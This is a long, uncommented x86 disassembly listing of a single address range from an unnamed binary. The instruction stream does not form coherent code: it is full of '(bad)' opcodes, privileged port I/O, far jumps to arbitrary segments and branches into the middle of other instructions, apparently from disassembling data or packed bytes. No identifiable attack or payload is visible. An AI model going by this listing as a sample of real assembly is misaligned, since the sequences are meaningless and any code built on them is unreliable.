  4216ab:	adc    BYTE PTR [edx],ah
  4216ad:	out    0xc4,eax
  4216af:	test   esp,ebp
  4216b1:	jmp    0xbdb23d0
  4216b6:	test   DWORD PTR [ebx+0x4b68fa44],eax
  4216bc:	repnz pop ecx
  4216be:	out    0x8b,eax
  4216c0:	les    ecx,FWORD PTR [ecx-0x4f]
  4216c3:	sbb    al,0xfe
  4216c5:	push   ecx
  4216c6:	fidivr DWORD PTR [ebp+ebx*1-0x7e]
  4216ca:	or     dl,BYTE PTR [esi-0x62]
  4216cd:	xor    bh,0x96
  4216d0:	add    BYTE PTR [ebx],bh
  4216d2:	push   esp
  4216d3:	dec    ecx
  4216d4:	xor    ah,BYTE PTR [esi+0x4be417cb]
  4216da:	pop    ss
  4216db:	jle    0x42168a
  4216dd:	mov    bh,0x94
  4216df:	mov    ds:0x5ff770b3,eax
  4216e4:	fadd   DWORD PTR [ecx]
  4216e6:	fst    st(4)
  4216e8:	das    
  4216e9:	pop    eax
  4216ea:	jo     0x42175b
  4216ec:	jg     0x42166e
  4216ee:	fist   WORD PTR [eax]
  4216f0:	test   DWORD PTR [edi+0x4c],ecx
  4216f3:	xchg   esi,eax
  4216f4:	mov    al,ds:0xce21827c
  4216f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216fa:	xchg   ch,al
  4216fc:	mov    esi,0x39855cf2
  421701:	mov    ah,0x29
  421703:	push   ss
  421704:	jp     0x421751
  421706:	dec    eax
  421707:	call   0x92f0:0x5fbb9706
  42170e:	and    BYTE PTR [eax-0x2ff8b31b],cl
  421714:	jg     0x4216ea
  421716:	sti    
  421717:	jo     0x42173e
  421719:	pop    si
  42171b:	add    al,0x4e
  42171d:	sub    DWORD PTR [edi-0x3f],ebx
  421720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421721:	pop    ebx
  421722:	xchg   BYTE PTR ds:0x62075af0,ah
  421728:	dec    esp
  421729:	ss fadd st,st(2)
  42172c:	mov    DWORD PTR [ecx*8-0x3f12565d],ecx
  421733:	mov    ebp,0xb144a6e5
  421738:	xchg   ebp,eax
  421739:	(bad)
  42173d:	test   bh,bl
  42173f:	ror    DWORD PTR [edi+ecx*8+0x21df8a97],cl
  421746:	inc    ebp
  421747:	sahf   
  421748:	outs   dx,BYTE PTR ds:[esi]
  421749:	mov    ah,BYTE PTR [ebx-0x4442d5d0]
  42174f:	dec    edx
  421750:	div    BYTE PTR [eax]
  421752:	mov    dh,0x88
  421754:	push   ebp
  421755:	clc    
  421756:	fadd   st,st(2)
  421758:	call   0x1d607769
  42175d:	sbb    bl,BYTE PTR [ecx]
  42175f:	fs addr16 mov edx,0x951c97ba
  421766:	int3   
  421767:	scas   eax,DWORD PTR es:[edi]
  421768:	add    DWORD PTR cs:[ebx-0xdf22a97],ebp
  42176f:	(bad)  
  421770:	scas   al,BYTE PTR es:[edi]
  421771:	or     eax,0x7816ef1a
  421776:	jmp    0x169b:0xfd6edd8e
  42177d:	adc    eax,0xb838f128
  421782:	sar    DWORD PTR ds:[ebp+0x5e9e3c13],cl
  421789:	or     eax,0xf0d48a0b
  42178e:	xchg   esi,eax
  42178f:	arpl   WORD PTR [edx-0x3a],di
  421792:	aad    0x19
  421794:	jo     0x4217d0
  421796:	pusha  
  421797:	pop    ebp
  421798:	and    eax,0x87b93a4f
  42179d:	push   0x42
  42179f:	xchg   ecx,eax
  4217a0:	mov    edi,0xd6da516e
  4217a5:	dec    ebp
  4217a6:	mov    eax,0x5aaac215
  4217ab:	cmp    DWORD PTR [ecx+0x33],0xfffffff5
  4217af:	jnp    0x421777
  4217b1:	aam    0xc4
  4217b3:	clc    
  4217b4:	adc    eax,0x6f6362c
  4217b9:	repz mov dh,0x24
  4217bc:	sbb    DWORD PTR [edx-0x6],esp
  4217bf:	jmp    0xa757:0x243fab14
  4217c6:	sub    ebx,DWORD PTR [esi+0x5d]
  4217c9:	inc    esp
  4217ca:	push   ebx
  4217cb:	ds ins DWORD PTR es:[edi],dx
  4217cd:	pop    esp
  4217ce:	mov    ebx,0xa2269933
  4217d3:	adc    ebx,edi
  4217d5:	or     BYTE PTR [edi+0x12],dl
  4217d8:	(bad)  
  4217da:	jmp    0x1a746126
  4217df:	sub    BYTE PTR gs:[esi],0x41
  4217e3:	imul   esp,DWORD PTR [ebx-0x67],0xdc7e36ea
  4217ea:	or     DWORD PTR [ebx+0x6c],0x24164379
  4217f1:	fnstenv [ebx-0x34]
  4217f4:	lea    esp,[edx-0x12f29518]
  4217fa:	push   eax
  4217fb:	inc    ecx
  4217fc:	and    esi,DWORD PTR [ecx-0x4b]
  4217ff:	shl    DWORD PTR [eax],cl
  421801:	inc    esp
  421802:	(bad)  
  421803:	mov    esp,0xa1e6dd8e
  421808:	mov    ah,0xcc
  42180a:	adc    esp,DWORD PTR [edi]
  42180c:	ret    
  42180d:	jns    0x421882
  42180f:	stc    
  421810:	pushf  
  421811:	rcr    DWORD PTR [eax+ecx*1+0x76],1
  421815:	ror    DWORD PTR [esi-0x5c5d481e],0xd0
  42181c:	jne    0x4217f7
  42181e:	cmp    esi,esi
  421820:	cmp    al,0xd4
  421822:	xchg   esp,eax
  421823:	mov    edi,0x7375b1e1
  421828:	cwde   
  421829:	jg     0x4217d4
  42182b:	(bad)  
  42182c:	jmp    0xfcb6:0x9b13615b
  421833:	aas    
  421834:	jmp    0x376f:0x6ebe1637
  42183b:	inc    ebp
  42183c:	sbb    al,0xc
  42183e:	pop    ss
  42183f:	(bad)  
  421840:	jmp    DWORD PTR [esi]
  421842:	pop    ebx
  421843:	mov    eax,0xd380ec3d
  421848:	mov    esi,0xd9a3679
  42184d:	outs   dx,BYTE PTR ds:[esi]
  42184e:	fadd   st(2),st
  421850:	into   
  421851:	test   DWORD PTR [eax+0x43],edx
  421854:	or     eax,0x236e3ca1
  421859:	mov    ecx,0x670ae005
  42185e:	push   ecx
  42185f:	in     eax,0xab
  421861:	dec    ebp
  421862:	outs   dx,DWORD PTR ds:[esi]
  421863:	sub    ebp,DWORD PTR [ebp+ebx*8-0x7b]
  421867:	daa    
  421868:	daa    
  421869:	or     esp,DWORD PTR [ebp-0x3ced9b43]
  42186f:	call   0x38d4:0x37beb8b8
  421876:	push   ss
  421877:	fdiv   QWORD PTR [edx+0x1f]
  42187a:	or     edx,DWORD PTR [edi+0x3b]
  42187d:	mov    eax,ds:0x40461d8f
  421882:	lds    ebx,FWORD PTR [edi-0x6170dd53]
  421888:	adc    eax,DWORD PTR [edx]
  42188a:	cs cwde 
  42188c:	jl     0x42190a
  42188e:	retf   
  42188f:	data16 or cl,BYTE PTR [ebx+0x74325b48]
  421896:	call   0xd720fd1d
  42189b:	and    BYTE PTR [esi-0x399492b2],bl
  4218a1:	push   0x62
  4218a3:	mov    ah,0xa4
  4218a5:	lea    edi,[ebx+0x13]
  4218a8:	scas   al,BYTE PTR es:[edi]
  4218a9:	mov    edi,0x91cb51e9
  4218ae:	adc    DWORD PTR [ecx],ecx
  4218b0:	jno    0x4218fd
  4218b2:	addr16 daa 
  4218b4:	cmp    al,0x8b
  4218b6:	push   edi
  4218b7:	add    bl,BYTE PTR [ebx+0xa65d395]
  4218bd:	test   BYTE PTR [ebp+0x4b],cl
  4218c0:	adc    al,0xda
  4218c2:	call   ebx
  4218c4:	cmc    
  4218c5:	cmp    BYTE PTR [ebp+0x5f215525],0xd6
  4218cc:	push   ebx
  4218cd:	hlt    
  4218ce:	outs   dx,BYTE PTR ds:[esi]
  4218cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218d0:	and    eax,0x2271e527
  4218d5:	fisubr WORD PTR [eax+esi*8]
  4218d8:	xor    al,0xa2
  4218da:	fild   WORD PTR [ebp+0x5a]
  4218dd:	stos   BYTE PTR es:[edi],al
  4218de:	pop    edx
  4218df:	jae    0x42194c
  4218e1:	ins    BYTE PTR es:[edi],dx
  4218e2:	popf   
  4218e3:	(bad)  
  4218e4:	lods   al,BYTE PTR ds:[esi]
  4218e5:	les    edi,FWORD PTR [ebx+0x7cfd2ab6]
  4218eb:	call   0x5185:0x939de935
  4218f2:	push   cs
  4218f3:	sbb    edi,DWORD PTR [eax-0x5a]
  4218f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218f7:	jmp    0xddada2b9
  4218fc:	int3   
  4218fd:	push   esi
  4218fe:	jbe    0x4218a7
  421900:	inc    esp
  421901:	test   DWORD PTR [ebp-0xa],esi
  421904:	fist   WORD PTR [ebx+0xf]
  421907:	imul   esp,DWORD PTR [esi],0x722de4ba
  42190d:	sbb    al,0x6
  42190f:	adc    edx,DWORD PTR [edi+edx*4]
  421912:	push   ecx
  421913:	or     dl,BYTE PTR [ebx+edi*2-0x64]
  421917:	cmc    
  421918:	mov    eax,0xc99a77c5
  42191d:	rcr    DWORD PTR [esi-0x318e4fd5],0xcb
  421924:	jne    0x421993
  421926:	repnz inc edi
  421928:	fcmovnbe st,st(1)
  42192a:	adc    BYTE PTR [edi],dl
  42192c:	sti    
  42192d:	test   dl,bl
  42192f:	cli    
  421930:	push   edx
  421931:	enter  0x5f8e,0xaf
  421935:	add    DWORD PTR [ebx+0x56ac69b3],edi
  42193b:	jle    0x421948
  42193d:	jle    0x42190c
  42193f:	ret    0x12a9
  421942:	sbb    esp,edx
  421944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421945:	pop    eax
  421946:	iret   
  421947:	nop
  421948:	aad    0xb7
  42194a:	mov    bh,0xa2
  42194c:	outs   dx,DWORD PTR ds:[esi]
  42194e:	fwait
  42194f:	jbe    0x421988
  421951:	js     0x421961
  421953:	sub    al,0xe0
  421955:	xor    eax,0xbc1cfca
  42195a:	enter  0xb11a,0xa9
  42195e:	adc    DWORD PTR [edi+eax*4-0x5f3dbce],ecx
  421965:	sbb    dl,dh
  421967:	jns    0x421989
  421969:	in     al,0xd8
  42196b:	loope  0x4218ff
  42196d:	iret   
  42196e:	inc    esi
  42196f:	mov    eax,edx
  421971:	in     eax,dx
  421972:	out    0x7f,al
  421974:	cmp    bl,bl
  421976:	mov    bh,0xca
  421978:	add    dh,BYTE PTR [eax-0x5f0dedb1]
  42197e:	dec    eax
  42197f:	aam    0x4e
  421981:	add    al,0x26
  421983:	fs mov ?,eax
  421986:	scas   eax,DWORD PTR es:[edi]
  421987:	adc    ah,ch
  421989:	inc    ebx
  42198a:	push   ecx
  42198b:	jge    0x421985
  42198d:	outs   dx,DWORD PTR ds:[esi]
  42198e:	fnsave [eax+0x528c7489]
  421994:	xlat   BYTE PTR ds:[ebx]
  421995:	sub    dl,BYTE PTR [esi]
  421997:	loop   0x421920
  421999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42199a:	pop    ebx
  42199b:	xor    al,0xa1
  42199d:	and    eax,0xd7d9316c
  4219a2:	lods   eax,DWORD PTR ds:[esi]
  4219a3:	les    ebx,FWORD PTR [esp+ebx*1-0x68cf1e37]
  4219aa:	push   ecx
  4219ab:	out    0x9f,al
  4219ad:	(bad)  
  4219ae:	jnp    0x4219c7
  4219b0:	mov    ebx,0xe14aad8a
  4219b5:	dec    DWORD PTR [edi+esi*8+0x51b8f5c4]
  4219bc:	mov    esi,esi
  4219be:	mov    eax,ds:0x6b1bfa59
  4219c3:	call   0x8a22a38d
  4219c8:	xchg   bl,al
  4219ca:	fcmovne st,st(7)
  4219cc:	ss stos BYTE PTR es:[edi],al
  4219ce:	xchg   esp,eax
  4219cf:	mov    ch,0xa1
  4219d1:	js     0x42196b
  4219d3:	jbe    0x4219d1
  4219d5:	mov    eax,0xb69ae1b8
  4219da:	loopne 0x421a1e
  4219dc:	pushf  
  4219dd:	push   ebp
  4219de:	xor    al,0xa9
  4219e0:	mov    ch,0x13
  4219e2:	addr16 cmp esp,ebx
  4219e5:	jl     0x421a4e
  4219e7:	and    al,BYTE PTR [esi-0x68]
  4219ea:	mov    BYTE PTR [edi+0x41],0xad
  4219ee:	call   0x858b:0x8f39f4e
  4219f5:	pop    es
  4219f6:	popa   
  4219f7:	js     0x421a5c
  4219f9:	or     BYTE PTR [ebx],0xe
  4219fc:	repz adc ch,0x58
  421a00:	out    dx,eax
  421a01:	pop    ss
  421a02:	scas   al,BYTE PTR es:[edi]
  421a03:	inc    edx
  421a04:	xchg   dx,ax
  421a06:	in     al,dx
  421a07:	xchg   edx,eax
  421a08:	adc    DWORD PTR [edx+0x3936841b],eax
  421a0e:	push   0xffffffb6
  421a10:	iret   
  421a11:	ds jne 0x421a53
  421a14:	mov    ds:0xe0e2999e,eax
  421a19:	sub    eax,0x423bb7fc
  421a1e:	pop    es
  421a1f:	xchg   esp,eax
  421a20:	rcl    BYTE PTR gs:[esi+0x1b],cl
  421a24:	sbb    edx,DWORD PTR [edi]
  421a26:	in     al,0x58
  421a28:	das    
  421a29:	aaa    
  421a2a:	sahf   
  421a2b:	rcr    BYTE PTR [ebx-0xa342f8b],0xcd
  421a32:	mov    cl,al
  421a34:	mov    gs,WORD PTR [ecx+0x55]
  421a37:	out    dx,al
  421a38:	push   edi
  421a39:	xchg   edx,edi
  421a3b:	mov    al,0x6c
  421a3d:	inc    edi
  421a3e:	inc    edi
  421a3f:	ret    
  421a40:	out    dx,eax
  421a41:	sub    al,0x15
  421a43:	jno    0x4219f1
  421a45:	bound  eax,QWORD PTR [edx+0x1d377663]
  421a4b:	stos   BYTE PTR es:[edi],al
  421a4c:	sbb    esi,edx
  421a4e:	lahf   
  421a4f:	sbb    DWORD PTR [ecx],esp
  421a51:	(bad)  
  421a52:	push   ecx
  421a53:	out    0xbc,eax
  421a55:	inc    edi
  421a56:	pop    ds
  421a57:	cmovge esi,DWORD PTR [ebx-0xa0408ab]
  421a5e:	hlt    
  421a5f:	shr    BYTE PTR ss:[esi+0xb045b7b],cl
  421a66:	imul   ecx,DWORD PTR [ebp-0x63e93068],0x61366c93
  421a70:	push   ebx
  421a71:	mov    dh,0x2a
  421a73:	test   BYTE PTR [ecx],al
  421a75:	loop   0x421a93
  421a77:	stos   BYTE PTR es:[edi],al
  421a78:	dec    esi
  421a79:	cdq    
  421a7a:	mov    BYTE PTR [esi+0x0],ah
  421a7d:	inc    esi
  421a7e:	fist   DWORD PTR [edx-0x7113b7dd]
  421a84:	mov    eax,ds:0xe5c81de9
  421a89:	xchg   edi,eax
  421a8a:	push   eax
  421a8b:	xchg   BYTE PTR [ebp-0x7433bdb6],ah
  421a91:	xchg   esp,eax
  421a92:	add    al,0x53
  421a94:	dec    edi
  421a95:	adc    BYTE PTR [ebx+eiz*4+0x1ab24654],al
  421a9c:	pop    ds
  421a9d:	jecxz  0x421a6d
  421a9f:	jno    0x421aae
  421aa1:	push   ebp
  421aa2:	shl    DWORD PTR [edx-0x65534be1],1
  421aa8:	(bad)  
  421aa9:	int3   
  421aaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421aab:	xchg   esi,eax
  421aac:	stos   DWORD PTR es:[edi],eax
  421aad:	xor    BYTE PTR [esi],cl
  421aaf:	and    al,0x76
  421ab1:	sub    dh,BYTE PTR [edi+edi*1+0x424d4179]
  421ab8:	mov    edi,0xb39b99bf
  421abd:	sbb    BYTE PTR [esi-0x92351e],0x9f
  421ac4:	add    BYTE PTR [esi],dl
  421ac6:	out    dx,al
  421ac7:	and    cl,0x1c
  421aca:	add    eax,0x76ac3b98
  421acf:	loope  0x421b34
  421ad1:	mov    ecx,0xfd28b9ea
  421ad6:	sbb    ch,BYTE PTR [esi-0xc]
  421ad9:	cmp    eax,0x2bf7f5d4
  421ade:	aad    0xd5
  421ae0:	jl     0x421a6a
  421ae2:	mov    ?,WORD PTR [edx]
  421ae4:	dec    esp
  421ae5:	retf   
  421ae6:	jno    0x421b4d
  421ae8:	ret    0x28f1
  421aeb:	mov    edx,DWORD PTR [edi]
  421aed:	dec    ebx
  421aee:	ins    BYTE PTR es:[edi],dx
  421aef:	pop    ss
  421af0:	inc    ecx
  421af1:	or     BYTE PTR [edi+0x5c],ch
  421af4:	and    esp,DWORD PTR [eax]
  421af6:	push   esp
  421af7:	xchg   edx,eax
  421af8:	fwait
  421af9:	cli    
  421afa:	dec    ecx
  421afb:	dec    edi
  421afc:	fistp  DWORD PTR [esi+0x34a80be9]
  421b02:	xchg   BYTE PTR [ecx+0x15aed436],cl
  421b08:	lahf   
  421b09:	call   FWORD PTR [ebx+0x34]
  421b0c:	popa   
  421b0d:	imul   edx,edi,0x97cae1e
  421b13:	(bad)
  421b17:	ins    DWORD PTR es:[edi],dx
  421b18:	and    eax,0xff49882b
  421b1d:	push   cs
  421b1e:	and    al,0x92
  421b20:	cld    
  421b21:	mov    ch,BYTE PTR [ebp-0x15ede949]
  421b27:	cmp    dl,BYTE PTR [ebp+0x1d]
  421b2a:	xor    DWORD PTR [eax],edi
  421b2c:	fild   WORD PTR [ebp-0x24]
  421b2f:	sbb    DWORD PTR [edx+0x6cea979d],esp
  421b35:	cmp    DWORD PTR [ebx-0x7f],edi
  421b38:	ror    DWORD PTR [edi],cl
  421b3a:	pop    esp
  421b3b:	sub    DWORD PTR [eax+ecx*2-0x7e646f56],0x113a143b
  421b46:	imul   ecx,DWORD PTR [ebx+0x28],0xfcb5e9dd
  421b4d:	and    al,0x3a
  421b4f:	add    edx,DWORD PTR [ebp-0x10]
  421b52:	out    0xe8,eax
  421b54:	rcr    BYTE PTR [esi+0x68],cl
  421b57:	add    al,0x5a
  421b59:	dec    esp
  421b5a:	(bad)  
  421b5c:	sbb    al,0xb5
  421b5e:	fcomp  QWORD PTR [eax]
  421b60:	(bad)  
  421b61:	cs push edi
  421b63:	mov    dl,0x9b
  421b65:	rol    DWORD PTR [eax],1
  421b67:	pusha  
  421b68:	pusha  
  421b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b6a:	xor    eax,0x4f02fae3
  421b6f:	lds    eax,FWORD PTR [ebx-0x36c5ad90]
  421b75:	add    DWORD PTR [edi],ebx
  421b77:	(bad)  
  421b78:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  421b7a:	stc    
  421b7b:	jp     0x421ba1
  421b7d:	aad    0x3e
  421b7f:	stc    
  421b80:	test   DWORD PTR [esi+0x44bffc03],edi
  421b86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b87:	int3   
  421b88:	jnp    0x421ba7
  421b8a:	mov    eax,0xa225e413
  421b8f:	pushf  
  421b90:	sbb    DWORD PTR [ecx],ebp
  421b92:	mov    eax,ds:0x573ca61
  421b97:	xchg   edi,eax
  421b98:	neg    BYTE PTR [edi]
  421b9a:	push   es
  421b9b:	mov    bh,0xae
  421b9d:	pop    ss
  421b9e:	push   ecx
  421b9f:	shl    DWORD PTR [ebp+0x42],0xc4
  421ba3:	adc    BYTE PTR [ecx],0xf3
  421ba6:	jecxz  0x421b7b
  421ba8:	in     eax,0x3d
  421baa:	scas   al,BYTE PTR es:[edi]
  421bab:	xchg   ecx,eax
  421bac:	adc    BYTE PTR [ebx],ah
  421bae:	aaa    
  421baf:	cli    
  421bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bb1:	sbb    al,0xd0
  421bb3:	out    0xac,eax
  421bb5:	jns    0x421bfe
  421bb7:	mov    ds:0xcb9dd842,al
  421bbc:	fistp  QWORD PTR [edi+0x6f0ce477]
  421bc2:	push   esi
  421bc3:	(bad)  
  421bc4:	scas   eax,DWORD PTR es:[edi]
  421bc5:	mov    esi,edx
  421bc7:	rcl    BYTE PTR [ecx],1
  421bc9:	jmp    0x421bfd
  421bcb:	mov    ah,0xdb
  421bcd:	das    
  421bce:	leave  
  421bcf:	fsub   st,st(1)
  421bd1:	push   ebp
  421bd2:	mov    WORD PTR [ecx],gs
  421bd4:	sub    BYTE PTR [eax],bl
  421bd6:	xchg   ecx,eax
  421bd7:	mov    ds:0x70f4280b,eax
  421bdc:	and    BYTE PTR [edi+0x25],cl
  421bdf:	xchg   edi,eax
  421be0:	pop    ss
  421be1:	mov    edx,0xa3da210e
  421be6:	add    al,0xe
  421be8:	or     ecx,DWORD PTR [edx-0x38797953]
  421bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bef:	inc    ebx
  421bf0:	hlt    
  421bf1:	dec    eax
  421bf2:	lods   eax,DWORD PTR ds:[esi]
  421bf3:	or     dh,cl
  421bf5:	cli    
  421bf6:	fsubr  st(4),st
  421bf8:	adc    al,ch
  421bfa:	stc    
  421bfb:	gs inc eax
  421bfd:	xchg   ebp,eax
  421bfe:	mov    esi,0xe93a82dc
  421c03:	(bad)  
  421c04:	fsubr  st(6),st
  421c06:	pop    ecx
  421c07:	cwde   
  421c08:	jge    0x421bac
  421c0a:	das    
  421c0b:	clc    
  421c0c:	(bad)
  421c10:	pop    ecx
  421c11:	mov    esp,0x3c6c5bc0
  421c16:	ins    BYTE PTR es:[edi],dx
  421c17:	mov    bl,0xbd
  421c19:	mov    dl,0xf8
  421c1b:	add    al,0x68
  421c1d:	lahf   
  421c1e:	xchg   edx,eax
  421c1f:	jbe    0x421bd2
  421c21:	mov    DWORD PTR [eax+edi*4+0x41],ecx
  421c25:	mov    al,0x35
  421c27:	sub    eax,0x58b74ac
  421c2c:	pop    ecx
  421c2d:	jo     0x421be5
  421c2f:	mov    edx,0xb20cf37c
  421c34:	mov    ebp,0x1cd59660
  421c39:	pop    ds
  421c3a:	mov    ebx,0x4568825a
  421c3f:	or     al,0xf6
  421c41:	ja     0x421bc9
  421c43:	push   ds
  421c44:	add    edi,esi
  421c46:	add    DWORD PTR [ebx],ebx
  421c48:	and    esi,DWORD PTR [esi]
  421c4a:	pop    ss
  421c4b:	push   eax
  421c4c:	jp     0x421bfc
  421c4e:	test   al,0xfe
  421c50:	int3   
  421c51:	dec    esi
  421c52:	cmp    cl,bh
  421c54:	adc    ah,BYTE PTR [esp+eax*1-0x2e]
  421c58:	add    ecx,DWORD PTR [ebx-0x49]
  421c5b:	xchg   edx,eax
  421c5c:	mov    eax,edi
  421c5e:	(bad)
  421c61:	mov    ds:0x7aae3134,al
  421c66:	retf   0xe8ad
  421c69:	xchg   BYTE PTR [ebp+0x5d0696d3],dh
  421c6f:	and    ecx,esi
  421c71:	in     eax,dx
  421c72:	aam    0x9f
  421c74:	jge    0x421cbd
  421c76:	xchg   esi,eax
  421c77:	jbe    0x421c1b
  421c79:	iret   
  421c7a:	mov    esp,0xd0a7771e
  421c7f:	mov    esp,0x659caea2
  421c84:	xchg   ecx,eax
  421c85:	test   eax,0x4c9c7c7e
  421c8a:	rcl    edi,1
  421c8c:	imul   ebp,edx,0x3520846d
  421c92:	mov    esi,0xe3bed0d9
  421c97:	arpl   WORD PTR ds:0x170df12e,dx
  421c9d:	pop    esp
  421c9e:	push   0xffffffa4
  421ca0:	jg     0x421c2d
  421ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ca3:	retf   
  421ca4:	push   ebp
  421ca5:	daa    
  421ca6:	mov    es,WORD PTR [edi+ebx*8]
  421ca9:	shr    DWORD PTR [esi],1
  421cab:	and    eax,0x24a5f7c1
  421cb0:	xor    eax,0x26d79546
  421cb5:	popa   
  421cb6:	xor    ebx,DWORD PTR [ebx-0x2e]
  421cb9:	add    al,0x45
  421cbb:	jb     0x421cdc
  421cbd:	sbb    ebp,DWORD PTR [ecx-0x291cbb67]
  421cc3:	pop    ebx
  421cc4:	shl    BYTE PTR [edi],0x63
  421cc7:	dec    edx
  421cc8:	lea    esp,[eax]
  421cca:	js     0x421cfd
  421ccc:	shl    esi,cl
  421cce:	jmp    0xa70a:0x497f892a
  421cd5:	fdiv   QWORD PTR [ebp+0x7db56052]
  421cdb:	push   ebx
  421cdc:	lock mov edi,0x5928c52
  421ce2:	sbb    eax,0xa9a5ffd4
  421ce7:	lods   al,BYTE PTR ds:[esi]
  421ce8:	sbb    eax,0xc27e0f33
  421ced:	jns    0x421d1b
  421cef:	cmp    DWORD PTR [ebp-0x40],0xffffffa8
  421cf3:	xor    eax,0x526ac9de
  421cf8:	lahf   
  421cf9:	push   cs
  421cfa:	aad    0x67
  421cfc:	mov    bl,0x6a
  421cfe:	inc    eax
  421cff:	jl     0x421cb8
  421d01:	mov    gs,WORD PTR [esi-0x70]
  421d04:	jmp    0xad4:0xc7340da2
  421d0b:	inc    edx
  421d0c:	cmp    BYTE PTR [ecx+0x35],ch
  421d0f:	xchg   esp,eax
  421d10:	sub    BYTE PTR [edi],0x75
  421d13:	add    eax,0x53814969
  421d18:	pop    ds
  421d19:	or     al,0xfa
  421d1b:	rcl    esi,cl
  421d1d:	xchg   edx,eax
  421d1e:	cld    
  421d1f:	sbb    BYTE PTR [ecx+0x7d],al
  421d22:	cdq    
  421d23:	adc    ch,BYTE PTR [edx]
  421d25:	xchg   BYTE PTR ds:0xfcc10854,al
  421d2b:	dec    edi
  421d2c:	xchg   ecx,eax
  421d2d:	inc    ebx
  421d2e:	mul    BYTE PTR [ecx]
  421d30:	dec    edi
  421d31:	popf   
  421d32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d33:	mov    ss,WORD PTR [edi-0x4c]
  421d36:	dec    BYTE PTR [edx-0x2d4d7a5b]
  421d3c:	shl    DWORD PTR [eax+edi*2+0x2e],1
  421d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d42:	sbb    edx,DWORD PTR [edi+0x7cef5c48]
  421d48:	test   ebx,edx
  421d4a:	cs inc edx
  421d4c:	test   esp,eax
  421d4e:	sbb    eax,0xd3a91b19
  421d53:	loope  0x421d7f
  421d55:	ror    DWORD PTR [ecx+0x10],1
  421d58:	and    DWORD PTR [esp+ecx*8-0x1c01b9e8],ebx
  421d5f:	add    BYTE PTR [edi],ch
  421d61:	fcmovnu st,st(1)
  421d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d64:	lds    esi,FWORD PTR [ecx-0x27ecc544]
  421d6a:	pop    edx
  421d6b:	dec    edi
  421d6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d6d:	aaa    
  421d6e:	mov    dh,al
  421d70:	jg     0xe454c76b
  421d76:	or     al,ch
  421d78:	xor    BYTE PTR [edi+0x43],ah
  421d7b:	mov    ds:0xba48b066,eax
  421d80:	nop
  421d81:	and    dh,BYTE PTR [ecx+0x1c]
  421d84:	(bad)  
  421d85:	mov    ecx,0x7cbf8f9a
  421d8a:	mov    eax,ds:0x3a515ba4
  421d8f:	mov    al,ds:0xba53515b
  421d94:	jg     0x421deb
  421d96:	jno    0x421dab
  421d98:	jne    0x421d9f
  421d9a:	push   esp
  421d9b:	jg     0x421d6b
  421d9d:	retf   0xf31f
  421da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421da1:	sbb    DWORD PTR [esi-0x56e1cfd5],ebp
  421da7:	sub    dl,BYTE PTR [ebp+eiz*8-0x76]
  421dab:	int    0xec
  421dad:	je     0x421de3
  421daf:	mov    WORD PTR [esi-0x3692f999],gs
  421db5:	mov    ebp,0x437610ec
  421dba:	add    eax,0xbc67cfbe
  421dbf:	push   edi
  421dc0:	sub    al,0xc1
  421dc2:	mov    ch,BYTE PTR [edi+0x794a7227]
  421dc8:	idiv   DWORD PTR [ecx+0x52]
  421dcb:	cdq    
  421dcc:	dec    ebp
  421dcd:	push   esp
  421dce:	fnstcw WORD PTR [esi]
  421dd0:	add    edx,DWORD PTR [ecx+eiz*1]
  421dd3:	push   ebx
  421dd4:	adc    BYTE PTR [ebp-0x3f1aa346],dh
  421dda:	iret   
  421ddb:	push   0xffffff8c
  421ddd:	mov    edi,edi
  421ddf:	mov    esi,0x5b250066
  421de4:	lock mov eax,ds:0xc69a191a
  421dea:	xor    al,0x1c
  421dec:	shr    DWORD PTR [ecx-0x1a],cl
  421def:	jmp    DWORD PTR [ecx+0x562f659a]
  421df5:	arpl   WORD PTR [edi+0x4de165d4],bx
  421dfb:	push   es
  421dfc:	dec    esp
  421dfd:	xchg   ebx,eax
  421dfe:	out    0x55,al
  421e00:	inc    ecx
  421e02:	into   
  421e03:	mov    bl,BYTE PTR [ebx+eax*4+0x6d]
  421e07:	jae    0x421df3
  421e09:	and    dl,BYTE PTR [edx+0x3dc5fdc1]
  421e0f:	cmc    
  421e10:	ins    DWORD PTR es:[edi],dx
  421e11:	push   eax
  421e12:	pop    esp
  421e13:	mov    edi,0x4d757d0e
  421e18:	and    eax,0x26c998e3
  421e1d:	mov    BYTE PTR [ecx+0x66574272],bl
  421e23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e24:	repnz mov al,ds:0x6ff05b19
  421e2a:	ja     0x421e2a
  421e2c:	pop    edx
  421e2d:	pop    es
  421e2e:	sbb    bl,BYTE PTR [ecx+0x5d9e25b1]
  421e34:	or     eax,0x959576d1
  421e39:	retf   0xea40
  421e3c:	dec    esp
  421e3d:	adc    edx,edi
  421e3f:	aam    0x2e
  421e41:	mov    ah,0x63
  421e43:	push   edi
  421e44:	js     0x421ea1
  421e46:	fwait
  421e47:	adc    BYTE PTR [edx+0x75feb2cc],bl
  421e4d:	cwde   
  421e4e:	mov    ebx,DWORD PTR [eax-0x4e]
  421e51:	and    eax,0x24c77ae1
  421e56:	mov    ch,0xbb
  421e58:	aas    
  421e59:	fdivr  st(1),st
  421e5b:	pushf  
  421e5c:	shr    DWORD PTR [edi-0x64],0xb9
  421e60:	loope  0x421e77
  421e62:	mov    esi,0x293235f
  421e67:	mov    dl,0xc9
  421e69:	adc    BYTE PTR [edx],dl
  421e6b:	add    ch,cl
  421e6d:	xor    ecx,DWORD PTR [ebp+0x3d]
  421e70:	clc    
